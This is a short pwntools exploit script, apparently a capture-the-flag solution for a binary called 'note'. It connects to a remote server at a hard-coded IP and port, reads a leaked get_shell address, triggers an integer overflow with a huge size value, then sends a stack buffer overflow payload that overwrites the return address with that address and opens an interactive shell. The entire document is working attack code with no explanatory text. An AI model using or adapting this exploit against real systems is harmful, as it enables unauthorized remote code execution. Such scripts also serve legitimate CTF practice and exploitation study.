from pwn import *

# p = process("./note")
p = remote("141.164.39.45", 7878)
e = ELF("./note")
context.log_level = 'debug'

p.recvuntil(b'====================\n')
get_shell = int(p.recvline().split(b'(')[-1].split(b')')[0], 16)
log.success(f'get_shell : {hex(get_shell)}')
intoverflow = 9223372036854574281

p.sendlineafter(b"> ", str(intoverflow))

p.sendlineafter(b'Size : ', str(0x100000))

pl = b''
pl += b'A' * 112 + b'B' * 0x8
pl += p64(get_shell)

p.sendlineafter(b"Content : ", pl)

p.interactive()